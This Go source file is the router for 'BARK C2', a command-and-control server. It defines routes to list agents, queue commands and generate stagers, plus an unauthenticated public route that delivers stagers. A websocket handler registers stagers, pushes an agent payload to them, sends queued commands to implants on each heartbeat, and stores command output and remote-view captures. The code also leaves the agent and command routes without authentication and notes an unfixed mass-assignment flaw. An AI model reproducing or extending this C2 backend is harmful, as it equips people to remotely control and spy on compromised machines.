package router

import (
	"net/http"

	"encoding/json"
	"time"

	"github.com/Et43/BARK/agent"
	"github.com/Et43/BARK/config"
	"github.com/Et43/BARK/database/dao"
	"github.com/Et43/BARK/middleware"
	"github.com/casbin/casbin/v2"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func InitRouter(init *config.Initialization) *gin.Engine {
	router := gin.New()
	router.Use(gin.Logger())
	router.Use(gin.Recovery())

	router.Static("/static", "./static")

	templates := []string{
		"templates/**/*",
	}

	for _, pattern := range templates {
		router.LoadHTMLGlob(pattern)
	}

	// Fix the path to your model file
	enforcer, err := casbin.NewEnforcer("config/casbin/RESTful_model.conf", "config/casbin/policy.csv")
	if err != nil {
		panic(err)
	}

	// Define your policies
	enforcer.AddPolicy("admin", "/api/user", "GET")
	enforcer.AddPolicy("admin", "/api/user", "POST")
	enforcer.AddPolicy("admin", "/api/user", "PUT")
	enforcer.AddPolicy("admin", "/api/user", "DELETE")
	enforcer.AddPolicy("user", "/api/user", "GET")

	// Save the policy back to the file
	enforcer.SavePolicy()

	// Create authorization middleware
	authz := AuthMiddleware(enforcer)

	/*
	* API authentication routes
	*
	* /api/auth/login POST - Login route TODO: REMOVE MASS ASSIGNMENT VULN ()
	* /api/auth/register POST - Register route
	 */
	auth := router.Group("/api/auth")
	{
		auth.POST("/login", init.AuthCtrl.Login)
		auth.POST("/register", init.AuthCtrl.Register)
	}

	/*
	*  API user management routes
	*  All routes in this group require a valid JWT token
	*  and are protected by Casbin authorization middleware
	*
	*  /api/user GET - Get all users (admin only) or show the current users data (normal useage))
	*  /api/user POST - Add a new user (admin only)
	*  /api/user/:userID GET - Get a user by ID (admin only)
	*  /api/user/:userID PUT - Update a user by ID (admin only)
	 */
	api := router.Group("/api")
	api.Use(middleware.JWTAuth()) // Apply JWT authentication to all API routes
	{
		// Apply Casbin authorization middleware to user group
		user := api.Group("/user", authz)
		user.GET("", init.UserCtrl.GetAllUserData)
		user.POST("", init.UserCtrl.AddUserData)
		user.GET("/:userID", init.UserCtrl.GetUserById)
		user.PUT("/:userID", init.UserCtrl.UpdateUserData)
		user.DELETE("/:userID", init.UserCtrl.DeleteUser)
	}

	/*
	* CORE routes
	*
	*	/ GET - Index route
	 */
	router.GET("/", func(c *gin.Context) {
		// Default values for stats if user is not authenticated
		stats := gin.H{
			"sessions": 0,
			"clients":  0,
		}

		c.HTML(200, "base.tmpl", gin.H{
			"message": "Welcome to BARK C2",
			"stats":   stats,
		})
	})

	router.GET("/dashboard/:agentID", init.DashboardCtrl.ShowDashboard)

	/*
	* AGENT routes
	*HTML()
	 */
	agentRoute := router.Group("/agents")
	agentRoute.GET("", init.AgentCtrl.GetAgents)
	agentRoute.GET("/:agentID", init.AgentCtrl.GetAgentByID)
	agentRoute.GET("/stagers", init.AgentCtrl.GetStagers)
	agentRoute.GET("/clear", init.AgentCtrl.ClearAgents)

	/*
	* COMMAND routes
	*
	 */
	commandRoutes := router.Group("/commands")
	{
		commandRoutes.POST("/agent/:agentID", init.CommandCtrl.QueueCommand)
		commandRoutes.GET("/agent/:agentID/pending", init.CommandCtrl.GetPendingCommands)
		commandRoutes.GET("/agent/:agentID/history", init.CommandCtrl.GetCommandHistory)
		commandRoutes.DELETE("/agent/:agentID/history/:commandID", init.CommandCtrl.RemoveCompletedCommand)
		commandRoutes.POST("/clear", init.CommandCtrl.ClearAllCommands)

		commandRoutes.GET("/agent/:agentID/remote_view", init.CommandCtrl.GetLatestRemoteView)
		commandRoutes.GET("/agent/:agentID/remote_view/history", init.CommandCtrl.GetRemoteViewHistory)
	}

	/*
	* STAGER routes
	*
	 */
	stagerRoutes := router.Group("/api/stager")
	stagerRoutes.Use(middleware.JWTAuth()) // Require authentication for stager operations
	{
		stagerRoutes.GET("/plugins", init.StagerCtrl.GetAvailablePlugins)
		stagerRoutes.POST("/generate", init.StagerCtrl.GenerateStager)
		stagerRoutes.GET("/file/:filename", init.StagerCtrl.GetStagerFile)

		// Plugin management routes
		stagerRoutes.POST("/plugins", init.StagerCtrl.CreatePlugin)
		stagerRoutes.PUT("/plugins/:name", init.StagerCtrl.UpdatePlugin)
		stagerRoutes.DELETE("/plugins/:name", init.StagerCtrl.DeletePlugin)
		stagerRoutes.GET("/plugins/template", init.StagerCtrl.GetPluginTemplate)
	}

	/*
	* DEBUG routes
	*
	 */
	debugRoutes := router.Group("/debug")
	debugRoutes.Use(middleware.JWTAuth()) // Require authentication for debug operations
	{
		debugRoutes.GET("/", init.DebugCtrl.GetDebugDashboard)
		debugRoutes.GET("/api/redis-queues", init.DebugCtrl.GetRedisQueueData)
		debugRoutes.GET("/api/agents", init.DebugCtrl.GetAgentDebugData)
		debugRoutes.GET("/api/health", init.DebugCtrl.GetSystemHealth)
		debugRoutes.GET("/api/websockets", init.DebugCtrl.GetWebSocketConnections)
		debugRoutes.POST("/api/flush-queues", init.DebugCtrl.FlushRedisQueues)
		debugRoutes.GET("/api/test-db", init.DebugCtrl.TestDatabaseConnection)
	}

	// Public stager delivery route (no authentication required for delivery)
	router.GET("/stager/:filename", init.StagerCtrl.GetStagerForDelivery)

	/*
	* WEBSOCKET routes
	*
	* /ws GET - Websocket route
	 */
	router.GET("/ws", func(c *gin.Context) {
		conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
		println("Connection requested")
		if err != nil {
			println(err.Error())
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		defer conn.Close()

		// Handle WebSocket connection
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				println("Error reading message:", err.Error())
				break
			}

			// Parse the message
			var message map[string]interface{}
			if err := json.Unmarshal(msg, &message); err != nil {
				println("Error parsing message:", err.Error())
				continue
			}

			// Get message type
			messageType, ok := message["type"].(string)
			if !ok {
				continue
			}

			println("Received message:", messageType)

			// Handle stager registration
			if messageType == "stager_registration" {
				// Extract agent details from registration message
				agentID, _ := message["agentId"].(string)
				systemInfoRaw, hasSystemInfo := message["systemInfo"].(map[string]interface{})

				// Create a new agent in the database
				agentS := &dao.Agent{
					Name:     agentID,
					IsStager: true, // Mark as stager initially
					SourceIP: c.ClientIP(),
				}

				// Convert system info to JSON string for storage
				if hasSystemInfo {
					systemInfoBytes, err := json.Marshal(systemInfoRaw)
					if err == nil {
						agentS.SystemInfo = string(systemInfoBytes)
					}
				}

				// Save the agent to the database
				init.AgentCtrl.CreateAgent(agentS)

				agentPayload := agent.GetAgentPayload(agentID)

				// Send acknowledgment response
				response := map[string]interface{}{
					"type":      "agent_payload",
					"agentId":   agentID,
					"timestamp": time.Now().Format(time.RFC3339),
					"message":   "Registration successful, delivering agent payload",
					"payload":   agentPayload,
				}

				responseBytes, _ := json.Marshal(response)
				conn.WriteMessage(websocket.TextMessage, responseBytes)

				println("Stager registered:", agentID)
				continue
			}

			// Handle agent activation (full agent connection)
			if messageType == "agent_activation" {
				// Extract agent details from activation message
				agentID, _ := message["agentId"].(string)
				version, _ := message["version"].(string)
				systemInfoRaw, hasSystemInfo := message["systemInfo"].(map[string]interface{})
				capabilities, _ := message["capabilities"].(map[string]interface{})

				println("Agent activation received for:", agentID)

				// Try to find existing agent first
				existingAgent, err := init.AgentCtrl.GetAgentByName(agentID)
				if err != nil {
					// Agent doesn't exist, create new one
					agentS := &dao.Agent{
						Name:     agentID,
						IsStager: false, // This is a full agent
						SourceIP: c.ClientIP(),
					}

					// Convert system info to JSON string for storage
					if hasSystemInfo {
						systemInfoBytes, err := json.Marshal(systemInfoRaw)
						if err == nil {
							agentS.SystemInfo = string(systemInfoBytes)
						}
					}

					// Convert capabilities to JSON string for storage
					if capabilities != nil {
						capabilitiesBytes, err := json.Marshal(capabilities)
						if err == nil {
							agentS.Capabilities = string(capabilitiesBytes)
						}
					}

					// Set version if provided
					if version != "" {
						agentS.Version = version
					}

					// Save the agent to the database
					init.AgentCtrl.CreateAgent(agentS)
					println("New agent created:", agentID)
				} else {
					// Agent exists, update it
					existingAgent.IsStager = false // Upgrade from stager to full agent
					existingAgent.SourceIP = c.ClientIP()

					// Update system info if provided
					if hasSystemInfo {
						systemInfoBytes, err := json.Marshal(systemInfoRaw)
						if err == nil {
							existingAgent.SystemInfo = string(systemInfoBytes)
						}
					}

					// Update capabilities if provided
					if capabilities != nil {
						capabilitiesBytes, err := json.Marshal(capabilities)
						if err == nil {
							existingAgent.Capabilities = string(capabilitiesBytes)
						}
					}

					// Update version if provided
					if version != "" {
						existingAgent.Version = version
					}

					// Save the updated agent
					init.AgentCtrl.UpdateAgent(existingAgent)
					println("Existing agent updated:", agentID)
				}

				// Send acknowledgment response
				response := map[string]interface{}{
					"type":      "activation_ack",
					"agentId":   agentID,
					"timestamp": time.Now().Format(time.RFC3339),
					"message":   "Agent activation successful",
				}

				responseBytes, _ := json.Marshal(response)
				conn.WriteMessage(websocket.TextMessage, responseBytes)

				println("Agent activation confirmed:", agentID)
				continue
			}

			// Handle heartbeat messages - this is where we check for pending commands
			if messageType == "heartbeat" {
				agentID, agentOk := message["agentId"].(string)
				if !agentOk {
					// Invalid heartbeat, no agent ID
					println("Invalid heartbeat, no agent ID")
					continue
				}

				// Update agent's last seen timestamp
				_, err := init.AgentCtrl.GetAgentByName(agentID)
				if err != nil {
					println("Error retrieving agent:", err.Error())

					// Agent doesn't exist, create it as a basic agent
					println("Creating missing agent from heartbeat:", agentID)
					agentS := &dao.Agent{
						Name:     agentID,
						IsStager: false, // Assume it's a full agent if sending heartbeats
						SourceIP: c.ClientIP(),
					}

					// Create the agent
					init.AgentCtrl.CreateAgent(agentS)
					println("Agent created from heartbeat:", agentID)
				} else {
					// Agent exists, we could update last seen timestamp here if needed
					println("Agent found for heartbeat:", agentID)
				}

				// IMPORTANT: Always use the original agent name for command lookup
				commandQueryID := agentID // Always use agent name for consistency
				println("I AM USING THIS========================", commandQueryID)

				// Look for pending commands for this agent using agent name
				command, err := init.CommandSvc.DequeueCommand(commandQueryID)
				println("Checked for commands for agent:", agentID)

				if err != nil {
					println("Error retrieving command:", err.Error())

					// Send a simple pong response
					response := map[string]interface{}{
						"type":      "pong",
						"timestamp": time.Now().Format(time.RFC3339),
					}
					responseBytes, _ := json.Marshal(response)
					conn.WriteMessage(websocket.TextMessage, responseBytes)
					continue
				}

				if command != nil {
					println("Command found for agent:", agentID, "Command:", command.Command)
					// We have a command to send to the agent
					response := map[string]interface{}{
						"type":      "command",
						"timestamp": time.Now().Format(time.RFC3339),
						"command": map[string]interface{}{
							"id":     command.ID,
							"action": command.Command,
						},
					}

					responseBytes, _ := json.Marshal(response)
					println("Sending command to agent:", string(responseBytes))

					if err := conn.WriteMessage(websocket.TextMessage, responseBytes); err != nil {
						println("Error sending command:", err.Error())
						// Try to put the command back in the queue
						init.CommandSvc.QueueCommand(commandQueryID, command.Command)
					} else {
						println("Command sent successfully to agent:", agentID)
					}
				} else {
					// No commands, send normal pong
					println("No commands for agent:", agentID)
					response := map[string]interface{}{
						"type":      "pong",
						"timestamp": time.Now().Format(time.RFC3339),
					}
					responseBytes, _ := json.Marshal(response)
					conn.WriteMessage(websocket.TextMessage, responseBytes)
				}
			} else if messageType == "command_result" {
				// Handle command result response
				println("Command result received")

				agentID, agentOk := message["agentId"].(string)
				if !agentOk {
					println("Invalid command result, no agent ID")
					continue
				}

				commandID, commandOk := message["commandId"].(string)
				if !commandOk {
					println("Invalid command result, no command ID")
					continue
				}

				result := message["result"]
				success, _ := message["success"].(bool)

				// Convert result to string for storage
				resultStr := ""
				if result != nil {
					resultBytes, err := json.Marshal(result)
					if err == nil {
						resultStr = string(resultBytes)
						println("Command result:", resultStr)
					} else {
						println("Error marshaling result:", err.Error())
					}
				}

				// Update command status based on success
				status := "completed"
				if !success {
					status = "failed"
				}

				err = init.CommandSvc.UpdateCommandStatus(agentID, commandID, status, resultStr)
				if err != nil {
					println("Error updating command status:", err.Error())
				} else {
					println("Command status updated successfully")
				}

				// Send acknowledgment
				response := map[string]interface{}{
					"type":      "command_ack",
					"commandId": commandID,
					"timestamp": time.Now().Format(time.RFC3339),
				}
				responseBytes, _ := json.Marshal(response)
				conn.WriteMessage(websocket.TextMessage, responseBytes)
			} else if messageType == "remote_view_result" {
				println("Remote view result received")
				agentID, agentOk := message["agentId"].(string)
				if !agentOk {
					println("Invalid remote view result, no agent ID")
					continue
				}

				commandID, commandOk := message["commandId"].(string)
				if !commandOk {
					println("Invalid remote view result, no command ID")
					continue
				}

				result := message["result"]
				// Convert result to string for storage
				resultStr := ""
				if result != nil {
					resultBytes, err := json.Marshal(result)
					if err == nil {
						resultStr = string(resultBytes)
					} else {
						println("Error marshaling result:", err.Error(), resultStr)
						continue
					}
				}

				// Store the remote view data directly in Redis
				err = init.CommandSvc.StoreRemoteViewData(agentID, resultStr)
				if err != nil {
					println("Error storing remote view result:", err.Error())
				} else {
					println("Remote view result stored successfully in Redis")

					// Try to also update command status, but don't fail if it doesn't work
					// This is just for historical records
					err = init.CommandSvc.UpdateCommandStatus(agentID, commandID, "completed", resultStr)
					if err != nil {
						println("Note: Could not update command history, but data was stored in Redis")
					}
				}

				// Send acknowledgment
				response := map[string]interface{}{
					"type":      "remote_view_ack",
					"commandId": commandID,
					"timestamp": time.Now().Format(time.RFC3339),
				}
				responseBytes, _ := json.Marshal(response)
				conn.WriteMessage(websocket.TextMessage, responseBytes)

			} else if messageType == "payload_received" {
				// Handle payload acknowledgment (stager -> agent upgrade)
				agentID, _ := message["agentId"].(string)
				status, _ := message["status"].(string)

				if status == "success" && agentID != "" {
					// Update agent from stager to full agent
					init.AgentCtrl.SetStager(agentID, false)

					println("Agent upgraded from stager:", agentID)
				}
			}
		}
	})

	return router
}

// AuthMiddleware returns a Gin middleware for Casbin authorization
func AuthMiddleware(enforcer *casbin.Enforcer) gin.HandlerFunc {
	return func(c *gin.Context) {
		// Get current user role from context (set by JWT middleware)
		role, exists := c.Get("userRole")
		if !exists {
			c.AbortWithStatusJSON(401, gin.H{"error": "Unauthorized, no role found"})
			return
		}

		path := c.Request.URL.Path
		method := c.Request.Method

		// Check if the user has permission
		allowed, err := enforcer.Enforce(role, path, method)
		if err != nil {
			c.AbortWithStatusJSON(500, gin.H{"error": "Authorization error"})
			return
		}

		if !allowed {
			c.AbortWithStatusJSON(403, gin.H{"error": "Forbidden"})
			return
		}

		c.Next()
	}
}
